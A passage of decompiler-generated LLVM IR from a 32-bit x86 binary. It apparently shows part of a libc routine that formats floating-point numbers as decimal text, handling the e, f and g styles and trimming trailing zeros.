  %v4_80526f8 = fmul x86_fp80 %v1_8052721, %v3_80526f2
  store x86_fp80 %v4_80526f8, x86_fp80* %st1.global-to-local, align 4
  %v4_80526fc = fcmp ule x86_fp80 %v4_80526f8, %v3_80526f2
  br i1 %v4_80526fc, label %dec_label_pc_8052731, label %dec_label_pc_8052700

dec_label_pc_8052700:                             ; preds = %dec_label_pc_80526ed
  store x86_fp80 %v4_80526f8, x86_fp80* %st1.global-to-local, align 4
  %v5_805270a = sub i32 %stack_var_-220.0, %v0_8052737
  br label %dec_label_pc_8052733

dec_label_pc_8052710:                             ; preds = %dec_label_pc_80526e6
  %v3_8052710 = mul i32 %v1_80526e8, 12
  store i32 %v3_8052710, i32* %eax.global-to-local, align 4
  %v1_8052713 = add i32 %v3_8052710, ptrtoint (x86_fp80** @global_var_8058580.237 to i32)
  %v2_8052713 = inttoptr i32 %v1_8052713 to x86_fp80*
  %v3_8052713 = load x86_fp80, x86_fp80* %v2_8052713, align 4
  %v4_8052719 = fdiv x86_fp80 %v3_8052713, %v1_8052721
  store x86_fp80 %v4_8052719, x86_fp80* %st1.global-to-local, align 4
  %v4_805271b = fcmp ogt x86_fp80 %v3_8052713, %v1_8052721
  br i1 %v4_805271b, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8052710
  store x86_fp80 %v3_8052713, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8052721

bb183:                                            ; preds = %dec_label_pc_8052710
  %v5_805271b = fcmp olt x86_fp80 %v3_8052713, %v1_8052721
  br i1 %v5_805271b, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_8052713, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8052731

bb184:                                            ; preds = %bb183
  %not.v6_805271b = fcmp une x86_fp80 %v3_8052713, %v1_8052721
  store x86_fp80 %v3_8052713, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_805271b, label %dec_label_pc_8052731, label %dec_label_pc_8052721

dec_label_pc_8052721:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8052713, x86_fp80* %st1.global-to-local, align 4
  %v5_805272b = add i32 %stack_var_-220.0, %v0_8052737
  br label %dec_label_pc_8052733

dec_label_pc_8052731:                             ; preds = %dec_label_pc_80526ed, %.thread51, %bb184
  %v1_8052731 = phi x86_fp80 [ %v1_8052721, %.thread51 ], [ %v1_8052721, %bb184 ], [ %v3_80526f2, %dec_label_pc_80526ed ]
  %v0_80526e680 = phi x86_fp80 [ %v3_8052713, %.thread51 ], [ %v3_8052713, %bb184 ], [ %v4_80526f8, %dec_label_pc_80526ed ]
  store x86_fp80 %v1_8052731, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8052733

dec_label_pc_8052733:                             ; preds = %dec_label_pc_8052721, %dec_label_pc_8052700, %dec_label_pc_8052731
  %v2_80526e981 = phi x86_fp80 [ %v1_8052731, %dec_label_pc_8052731 ], [ %v2_80526e9, %dec_label_pc_8052721 ], [ %v1_8052721, %dec_label_pc_8052700 ]
  %v0_80526e679 = phi x86_fp80 [ %v0_80526e680, %dec_label_pc_8052731 ], [ %v3_8052713, %dec_label_pc_8052721 ], [ %v4_80526f8, %dec_label_pc_8052700 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8052731 ], [ %v5_805272b, %dec_label_pc_8052721 ], [ %v5_805270a, %dec_label_pc_8052700 ]
  %v1_8052733 = icmp eq i32 %v1_80526e8, 0
  br i1 %v1_8052733, label %.thread60, label %dec_label_pc_8052737

dec_label_pc_8052737:                             ; preds = %dec_label_pc_8052733
  %v2_8052737 = sdiv i32 %v0_8052737, 2
  store i32 %v2_8052737, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80526e6

.thread60:                                        ; preds = %dec_label_pc_8052733
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_805275b

dec_label_pc_805275b:                             ; preds = %dec_label_pc_805263e, %.thread60
  %v0_8052815 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_805263e ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_805263e ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_805275f = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8052636, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8052772 = and i32 %v2_805275f, -65536
  %v1_8052777 = udiv i16 %tmp146, 256
  %v2_8052777 = zext i16 %v1_8052777 to i32
  %v3_8052777 = or i32 %v2_8052777, 12
  %v10_8052777 = mul nuw nsw i32 %v3_8052777, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8052772.masked = zext i16 %tmp194 to i32
  %v11_8052777 = or i32 %v10_8052777, %v4_8052772.masked
  %v12_8052777 = or i32 %v11_8052777, %v6_8052772
  store i32 %v12_8052777, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805277f

dec_label_pc_805277f:                             ; preds = %dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge, %dec_label_pc_805275b
  %v2_80527a4 = phi x86_fp80 [ %storemerge, %dec_label_pc_805275b ], [ %v2_80527a4.pre, %dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge ]
  %v1_805277f = phi i3 [ %v1_8052636, %dec_label_pc_805275b ], [ %v1_805277f.pre, %dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge ]
  %v3_80527a6 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_805275b ], [ %v0_805277f.pre, %dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805275f, %dec_label_pc_805275b ], [ %v4_805279f, %dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_80527a6 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8052799 = sitofp i32 %tmp195 to x86_fp80
  %v4_805279f = add i32 %stack_var_-212.0, 9
  %v4_80527a4 = fsub x86_fp80 %v2_80527a4, %v5_8052799
  store i3 %v1_805277f, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80527a6 = fmul x86_fp80 %v3_80527a6, %v4_80527a4
  store x86_fp80 %v4_80527a6, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80527a8

dec_label_pc_80527a8:                             ; preds = %dec_label_pc_80527a8.dec_label_pc_80527a8_crit_edge, %dec_label_pc_805277f
  %v0_80527bc = phi i32 [ %v0_80527bc.pre, %dec_label_pc_80527a8.dec_label_pc_80527a8_crit_edge ], [ %tmp195, %dec_label_pc_805277f ]
  %v0_80527ac = phi i32 [ %v0_80527ac.pre, %dec_label_pc_80527a8.dec_label_pc_80527a8_crit_edge ], [ 0, %dec_label_pc_805277f ]
  %v1_80527ac = add i32 %v0_80527ac, 1
  store i32 %v1_80527ac, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_80527b6 = sub i32 %v4_805279f, %v1_80527ac
  %div = udiv i32 %v0_80527bc, 10
  %tmp185 = urem i32 %v0_80527bc, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_80527c2 = and i32 %div, 536870656
  store i32 %v2_80527b6, i32* %edx.global-to-local, align 4
  %v1_80527c8 = trunc i32 %tmp185 to i8
  %v2_80527c8 = or i8 %v1_80527c8, 48
  %v12_80527c8 = zext i8 %v2_80527c8 to i32
  %v15_80527c8 = or i32 %v12_80527c8, %v3_80527c2
  store i32 %v15_80527c8, i32* %eax.global-to-local, align 4
  %v3_80527cd = inttoptr i32 %v2_80527b6 to i8*
  store i8 %v2_80527c8, i8* %v3_80527cd, align 1
  %v7_80527cf = icmp sgt i32 %v1_80527ac, 8
  br i1 %v7_80527cf, label %dec_label_pc_80527d1, label %dec_label_pc_80527a8.dec_label_pc_80527a8_crit_edge

dec_label_pc_80527a8.dec_label_pc_80527a8_crit_edge: ; preds = %dec_label_pc_80527a8
  %v0_80527ac.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80527bc.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80527a8

dec_label_pc_80527d1:                             ; preds = %dec_label_pc_80527a8
  %v0_80527d1 = load i32, i32* @edi, align 4
  %v1_80527d1 = add i32 %v0_80527d1, 1
  store i32 %v1_80527d1, i32* @edi, align 4
  %v7_80527d5 = icmp sgt i32 %v1_80527d1, 2
  br i1 %v7_80527d5, label %dec_label_pc_80527d7, label %dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge

dec_label_pc_80527d1.dec_label_pc_805277f_crit_edge: ; preds = %dec_label_pc_80527d1
  %v0_805277f.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805277f.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80527a4.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805277f

dec_label_pc_80527d7:                             ; preds = %dec_label_pc_80527d1
  %v0_80527d7 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80527d7 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80527d7, x86_fp80* %st0.global-to-local, align 4
  %v2_80527d9 = add i3 %v0_80527d7, 2
  store i3 %v2_80527d9, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80527db = add i8 %stack_var_-207.0, -96
  %v6_80527db = sub i8 95, %stack_var_-207.0
  %v7_80527db = and i8 %v6_80527db, %stack_var_-207.0
  %v8_80527db = icmp slt i8 %v7_80527db, 0
  %v9_80527db = icmp eq i8 %v4_80527db, 0
  %v10_80527db = icmp slt i8 %v4_80527db, 0
  %v3_80527e0 = icmp eq i1 %v10_80527db, %v8_80527db
  %v4_80527e0 = icmp eq i1 %v9_80527db, false
  %v5_80527e0 = and i1 %v4_80527e0, %v3_80527e0
  br i1 %v5_80527e0, label %dec_label_pc_80527ef, label %dec_label_pc_80527e2

dec_label_pc_80527e2:                             ; preds = %dec_label_pc_80527d7
  %v4_80527e2 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_80527ef

dec_label_pc_80527ef:                             ; preds = %dec_label_pc_80527d7, %dec_label_pc_80527e2
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_80527d7 ], [ %v4_80527e2, %dec_label_pc_80527e2 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80527d7 ], [ 69, %dec_label_pc_80527e2 ]
  %v12_80527ef = icmp eq i8 %stack_var_-207.1, 103
  %v1_80527f4 = icmp eq i1 %v12_80527ef, false
  br i1 %v1_80527f4, label %dec_label_pc_80527fd, label %dec_label_pc_80527f6

dec_label_pc_80527f6:                             ; preds = %dec_label_pc_80527ef
  %v0_80527f6 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_80527f6, 1
  br i1 %tmp186, label %dec_label_pc_8052804, label %dec_label_pc_80527fa

dec_label_pc_80527fa:                             ; preds = %dec_label_pc_80527f6
  %v1_80527fa = add i32 %v0_80527f6, -1
  store i32 %v1_80527fa, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052804

dec_label_pc_80527fd:                             ; preds = %dec_label_pc_80527ef
  %v12_80527fd = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_80527fd, label %dec_label_pc_8052808, label %dec_label_pc_80527fd.dec_label_pc_8052804_crit_edge

dec_label_pc_80527fd.dec_label_pc_8052804_crit_edge: ; preds = %dec_label_pc_80527fd
  %v0_8052804.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052804

dec_label_pc_8052804:                             ; preds = %dec_label_pc_80527fd.dec_label_pc_8052804_crit_edge, %dec_label_pc_80527f6, %dec_label_pc_80527fa
  %v0_8052804 = phi i32 [ %v0_8052804.pre, %dec_label_pc_80527fd.dec_label_pc_8052804_crit_edge ], [ %v0_80527f6, %dec_label_pc_80527f6 ], [ %v1_80527fa, %dec_label_pc_80527fa ]
  store i32 %v0_8052804, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052835

dec_label_pc_8052808:                             ; preds = %dec_label_pc_80527fd
  store i32 %v0_8052815, i32* %eax.global-to-local, align 4
  %v0_805280c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805280c = add i32 %v0_805280c, %v0_8052815
  store i32 %v2_805280c, i32* %ebx.global-to-local, align 4
  %v5_8052813 = icmp slt i32 %v2_805280c, -1
  br i1 %v5_8052813, label %dec_label_pc_8052815, label %dec_label_pc_8052835

dec_label_pc_8052815:                             ; preds = %dec_label_pc_8052808
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805281d = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_805281d, i32* %eax.global-to-local, align 4
  %v4_8052825 = bitcast i32* %stack_var_-72 to i8*
  %v5_8052825 = call i32 @__GI_memset(i8* %v4_8052825, i32 48, i32 21)
  store i32 %v5_8052825, i32* %eax.global-to-local, align 4
  %v0_8052835.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052835

dec_label_pc_8052835:                             ; preds = %dec_label_pc_8052808, %dec_label_pc_8052815, %dec_label_pc_8052804
  %v1_8052855 = phi i32 [ %v0_8052804, %dec_label_pc_8052804 ], [ %v2_805280c, %dec_label_pc_8052808 ], [ %v0_8052835.pr.pre, %dec_label_pc_8052815 ]
  %stack_var_-220.3 = phi i32 [ %v0_8052815, %dec_label_pc_8052804 ], [ %v0_8052815, %dec_label_pc_8052808 ], [ -1, %dec_label_pc_8052815 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8052848 = icmp sgt i32 %v1_8052855, 20
  br i1 %v7_8052848, label %dec_label_pc_805284a, label %dec_label_pc_8052855

dec_label_pc_805284a:                             ; preds = %dec_label_pc_8052835
  %v2_805284a = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_805284a, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052869.preheader

dec_label_pc_8052855:                             ; preds = %dec_label_pc_8052835
  %v0_8052855 = load i32, i32* @esp, align 4
  %v2_8052855 = add i32 %v1_8052855, 165
  %v3_8052855 = add i32 %v2_8052855, %v0_8052855
  store i32 %v3_8052855, i32* %eax.global-to-local, align 4
  %v1_805285c = add i32 %v3_8052855, 2
  %v2_805285c = inttoptr i32 %v1_805285c to i8*
  %v3_805285c = load i8, i8* %v2_805285c, align 1
  %v4_805285c = add i8 %v3_805285c, -53
  %v9_805285c = sub i8 52, %v3_805285c
  %v10_805285c = and i8 %v9_805285c, %v3_805285c
  %v11_805285c = icmp slt i8 %v10_805285c, 0
  %v13_805285c = icmp slt i8 %v4_805285c, 0
  store i32 %v1_805285c, i32* %ecx.global-to-local, align 4
  %v2_8052863 = icmp eq i1 %v13_805285c, %v11_805285c
  %v3_8052863 = zext i1 %v2_8052863 to i32
  br label %dec_label_pc_8052869.preheader

dec_label_pc_8052869.preheader:                   ; preds = %dec_label_pc_8052855, %dec_label_pc_805284a
  %v0_8052869102 = phi i32 [ %v1_805285c, %dec_label_pc_8052855 ], [ %v2_805284a, %dec_label_pc_805284a ]
  %storemerge71 = phi i32 [ %v3_8052863, %dec_label_pc_8052855 ], [ 0, %dec_label_pc_805284a ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052869

dec_label_pc_8052869:                             ; preds = %dec_label_pc_8052869.backedge, %dec_label_pc_8052869.preheader
  %v3_805286a = phi i32 [ %v3_805286a.pre, %dec_label_pc_8052869.backedge ], [ %storemerge71, %dec_label_pc_8052869.preheader ]
  %v0_8052869 = phi i32 [ %v0_805286c, %dec_label_pc_8052869.backedge ], [ %v0_8052869102, %dec_label_pc_8052869.preheader ]
  %v1_8052869 = add i32 %v0_8052869, -1
  store i32 %v1_8052869, i32* %ecx.global-to-local, align 4
  %v1_805286a = inttoptr i32 %v1_8052869 to i8*
  %v2_805286a = load i8, i8* %v1_805286a, align 1
  %v4_805286a = trunc i32 %v3_805286a to i8
  %v5_805286a = add i8 %v2_805286a, %v4_805286a
  store i8 %v5_805286a, i8* %v1_805286a, align 1
  %v0_805286c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805286c = inttoptr i32 %v0_805286c to i8*
  %v2_805286c = load i8, i8* %v1_805286c, align 1
  %v3_805286c = zext i8 %v2_805286c to i32
  %v4_805286c = load i32, i32* %edx.global-to-local, align 4
  %v5_805286c = and i32 %v4_805286c, -256
  %v6_805286c = or i32 %v5_805286c, %v3_805286c
  store i32 %v6_805286c, i32* %edx.global-to-local, align 4
  %v7_805286e = icmp eq i8 %v2_805286c, 48
  br i1 %v7_805286e, label %dec_label_pc_8052869.backedge, label %dec_label_pc_8052873

dec_label_pc_8052869.backedge:                    ; preds = %dec_label_pc_8052869, %dec_label_pc_8052873
  %v3_805286a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052869

dec_label_pc_8052873:                             ; preds = %dec_label_pc_8052869
  %v2_8052873 = add i8 %v2_805286c, -57
  %v7_8052873 = sub i8 56, %v2_805286c
  %v8_8052873 = and i8 %v7_8052873, %v2_805286c
  %v9_8052873 = icmp slt i8 %v8_8052873, 0
  %v10_8052873 = icmp eq i8 %v2_8052873, 0
  %v11_8052873 = icmp slt i8 %v2_8052873, 0
  %v3_8052876 = icmp eq i1 %v11_8052873, %v9_8052873
  %v4_8052876 = icmp eq i1 %v10_8052873, false
  %v5_8052876 = and i1 %v4_8052876, %v3_8052876
  br i1 %v5_8052876, label %dec_label_pc_8052869.backedge, label %dec_label_pc_8052878

dec_label_pc_8052878:                             ; preds = %dec_label_pc_8052873
  %v2_8052878 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8052878, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_805286c, %v2_8052878
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8052883, label %dec_label_pc_8052890

dec_label_pc_8052883:                             ; preds = %dec_label_pc_8052878
  store i32 %v2_805275f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052899

dec_label_pc_8052890:                             ; preds = %dec_label_pc_8052878
  store i32 %v2_8052878, i32* %edx.global-to-local, align 4
  store i32 %v2_8052878, i32* %ecx.global-to-local, align 4
  %v1_8052898 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8052898, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052899

dec_label_pc_8052899:                             ; preds = %dec_label_pc_8052883, %dec_label_pc_8052890
  %v0_8052899 = phi i32 [ %v0_805286c, %dec_label_pc_8052883 ], [ %v2_8052878, %dec_label_pc_8052890 ]
  %v1_8052899 = add i32 %v0_8052899, 1
  store i32 %v1_8052899, i32* %eax.global-to-local, align 4
  %v2_80528a0 = inttoptr i32 %v1_8052899 to i8*
  store i8 0, i8* %v2_80528a0, align 1
  br i1 %v1_80527f4, label %dec_label_pc_80528c6, label %dec_label_pc_80528ab

dec_label_pc_80528ab:                             ; preds = %dec_label_pc_8052899
  %v0_80528ab = load i32, i32* %esi.global-to-local, align 4
  %v5_80528ae = icmp slt i32 %v0_80528ab, -4
  br i1 %v5_80528ae, label %dec_label_pc_80528d3, label %dec_label_pc_80528b0

dec_label_pc_80528b0:                             ; preds = %dec_label_pc_80528ab
  %v1_80528b0 = load i32, i32* %ebx.global-to-local, align 4
  %v7_80528b2 = icmp slt i32 %v1_80528b0, %v0_80528ab
  br i1 %v7_80528b2, label %dec_label_pc_80528d3, label %dec_label_pc_80528bb

dec_label_pc_80528bb:                             ; preds = %dec_label_pc_80528b0
  %v2_80528bd = sub i32 %v1_80528b0, %v0_80528ab
  store i32 %v2_80528bd, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80528d7

dec_label_pc_80528c6:                             ; preds = %dec_label_pc_8052899
  %v4_80528c6 = zext i8 %stack_var_-207.1 to i32
  %v5_80528c6 = load i32, i32* %ebx.global-to-local, align 4
  %v6_80528c6 = and i32 %v5_80528c6, -256
  %v7_80528c6 = or i32 %v6_80528c6, %v4_80528c6
  store i32 %v7_80528c6, i32* %ebx.global-to-local, align 4
  %v10_80528ca = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_80528ca, label %dec_label_pc_80528c6.dec_label_pc_80528d7_crit_edge, label %dec_label_pc_80528d3

dec_label_pc_80528c6.dec_label_pc_80528d7_crit_edge: ; preds = %dec_label_pc_80528c6
  %v0_80528d7.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80528d7

dec_label_pc_80528d3:                             ; preds = %dec_label_pc_80528ab, %dec_label_pc_80528b0, %dec_label_pc_80528c6
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_80528c6 ], [ 103, %dec_label_pc_80528b0 ], [ 103, %dec_label_pc_80528ab ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528e1

dec_label_pc_80528d7:                             ; preds = %dec_label_pc_80528c6.dec_label_pc_80528d7_crit_edge, %dec_label_pc_80528bb
  %v0_80528d9 = phi i32 [ %v0_80528d7.pre, %dec_label_pc_80528c6.dec_label_pc_80528d7_crit_edge ], [ %v0_80528ab, %dec_label_pc_80528bb ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_80528c6.dec_label_pc_80528d7_crit_edge ], [ 102, %dec_label_pc_80528bb ]
  %v2_80528d7 = icmp slt i32 %v0_80528d9, 0
  store i32 %v0_80528d9, i32* %ebx.global-to-local, align 4
  %v1_80528db = icmp eq i1 %v2_80528d7, false
  br i1 %v1_80528db, label %dec_label_pc_80528e1, label %dec_label_pc_80528dd

dec_label_pc_80528dd:                             ; preds = %dec_label_pc_80528d7
  %v0_80528dd = load i32, i32* %edx.global-to-local, align 4
  %v1_80528dd = add i32 %v0_80528dd, -1
  store i32 %v1_80528dd, i32* %edx.global-to-local, align 4
  %v1_80528de = inttoptr i32 %v1_80528dd to i8*
  store i8 48, i8* %v1_80528de, align 1
  %v0_8052916.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528e1

dec_label_pc_80528e1:                             ; preds = %dec_label_pc_80528d7, %dec_label_pc_80528d3, %dec_label_pc_80528dd
  %v1_8052971 = phi i32 [ %v0_80528d9, %dec_label_pc_80528d7 ], [ %v0_8052916.pre, %dec_label_pc_80528dd ], [ 0, %dec_label_pc_80528d3 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_80528d7 ], [ %stack_var_-197.1, %dec_label_pc_80528dd ], [ %stack_var_-197.0, %dec_label_pc_80528d3 ]
  %v2_80528e1 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80528e1, i32* %eax.global-to-local, align 4
  %v0_80528f0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80528f0 = add i32 %v0_80528f0, 1
  store i32 %v1_80528f0, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_80528ff = inttoptr i32 %v0_80528f0 to i8*
  %v2_80528ff = load i8, i8* %v1_80528ff, align 1
  %v3_80528ff = zext i8 %v2_80528ff to i32
  %v5_80528ff = and i32 %v2_80528e1, -256
  %v6_80528ff = or i32 %v3_80528ff, %v5_80528ff
  store i32 %v6_80528ff, i32* %eax.global-to-local, align 4
  store i32 %v6_80528ff, i32* %stack_var_-22, align 4
  %v2_8052914 = sub i32 %v1_8052899, %v1_80528f0
  store i32 %v2_8052914, i32* %edx.global-to-local, align 4
  %v1_8052916 = icmp eq i32 %v1_8052971, 0
  %v2_8052916 = icmp slt i32 %v1_8052971, 0
  br i1 %v2_8052916, label %dec_label_pc_8052965, label %dec_label_pc_805291a

dec_label_pc_805291a:                             ; preds = %dec_label_pc_80528e1
  %v2_805291a = sub i32 %v1_8052971, %v2_8052914
  %v8_805291a = xor i32 %v2_8052914, %v1_8052971
  %v9_805291a = xor i32 %v2_805291a, %v1_8052971
  %v10_805291a = and i32 %v9_805291a, %v8_805291a
  %v11_805291a = icmp slt i32 %v10_805291a, 0
  %v13_805291a = icmp slt i32 %v2_805291a, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8052928 = icmp eq i1 %v13_805291a, %v11_805291a
  br i1 %v2_8052928, label %dec_label_pc_805292a, label %dec_label_pc_805295e

dec_label_pc_805292a:                             ; preds = %dec_label_pc_805291a
  store i32 %v2_805291a, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_805291a, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_805293f, label %dec_label_pc_805295a

dec_label_pc_805293f:                             ; preds = %dec_label_pc_805292a
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_805295a

dec_label_pc_805295a:                             ; preds = %dec_label_pc_805292a, %dec_label_pc_805293f
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_805293f ], [ %stack_var_-132, %dec_label_pc_805292a ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805297a

dec_label_pc_805295e:                             ; preds = %dec_label_pc_805291a
  %v4_8052960 = icmp eq i1 %v1_8052916, false
  br i1 %v4_8052960, label %dec_label_pc_805296b, label %dec_label_pc_8052962

dec_label_pc_8052962:                             ; preds = %dec_label_pc_805295e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052965

dec_label_pc_8052965:                             ; preds = %dec_label_pc_80528e1, %dec_label_pc_8052962
  %v0_80529ad112 = phi i32 [ %v1_8052971, %dec_label_pc_80528e1 ], [ -1, %dec_label_pc_8052962 ]
  %v2_8052965 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052965, i32* @ecx, align 4
  br label %dec_label_pc_805297a

dec_label_pc_805296b:                             ; preds = %dec_label_pc_805295e
  %v2_805296f = add i32 %v1_80528f0, %v1_8052971
  store i32 %v2_805296f, i32* %edi.global-to-local, align 4
  %v2_8052971 = sub i32 %v2_8052914, %v1_8052971
  store i32 %v2_8052971, i32* %edx.global-to-local, align 4
  %v2_8052973 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8052973, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805297a

dec_label_pc_805297a:                             ; preds = %dec_label_pc_8052965, %dec_label_pc_805295a, %dec_label_pc_805296b
  %v0_80529ad111 = phi i32 [ %v0_80529ad112, %dec_label_pc_8052965 ], [ -1, %dec_label_pc_805295a ], [ -1, %dec_label_pc_805296b ]
  %v0_8052996 = phi i32 [ %v2_8052965, %dec_label_pc_8052965 ], [ %storemerge28, %dec_label_pc_805295a ], [ %v2_8052973, %dec_label_pc_805296b ]
  %v0_8052987 = phi i32 [ %v2_8052914, %dec_label_pc_8052965 ], [ 0, %dec_label_pc_805295a ], [ %v2_8052971, %dec_label_pc_805296b ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_8052981 = inttoptr i32 %v1_80525f7 to i8*
  %v3_8052981 = load i8, i8* %v2_8052981, align 1
  %v4_8052981 = and i8 %v3_8052981, 16
  %v5_8052981 = icmp eq i8 %v4_8052981, 0
  %v1_8052985 = icmp eq i1 %v5_8052981, false
  br i1 %v1_8052985, label %dec_label_pc_8052996, label %dec_label_pc_8052987

dec_label_pc_8052987:                             ; preds = %dec_label_pc_805297a
  %v1_8052987 = icmp eq i32 %v0_8052987, 0
  %v1_8052989 = icmp eq i1 %v1_8052987, false
  br i1 %v1_8052989, label %dec_label_pc_8052996, label %dec_label_pc_805298b

dec_label_pc_805298b:                             ; preds = %dec_label_pc_8052987
  br i1 %v12_80527ef, label %dec_label_pc_80529ad, label %dec_label_pc_8052992

dec_label_pc_8052992:                             ; preds = %dec_label_pc_805298b
  %v0_8052992 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_8052992, 1
  br i1 %tmp189, label %dec_label_pc_80529ad, label %dec_label_pc_8052996

dec_label_pc_8052996:                             ; preds = %dec_label_pc_8052992, %dec_label_pc_8052987, %dec_label_pc_805297a
  %v1_8052996 = inttoptr i32 %v0_8052996 to i32*
  store i32 112, i32* %v1_8052996, align 4
  %v0_805299c = load i32, i32* @ecx, align 4
  %v1_805299c = add i32 %v0_805299c, 4
  %v2_805299c = inttoptr i32 %v1_805299c to i32*
  store i32 1, i32* %v2_805299c, align 4
  %v0_80529a3 = load i32, i32* @ecx, align 4
  %v1_80529a3 = add i32 %v0_80529a3, 8
  %v2_80529a3 = inttoptr i32 %v1_80529a3 to i32*
  store i32 ptrtoint (i32* @global_var_8058560.240 to i32), i32* %v2_80529a3, align 4
  %v0_80529aa = load i32, i32* @ecx, align 4
  %v1_80529aa = add i32 %v0_80529aa, 12
  store i32 %v1_80529aa, i32* @ecx, align 4
  %v0_80529ad.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80529ad

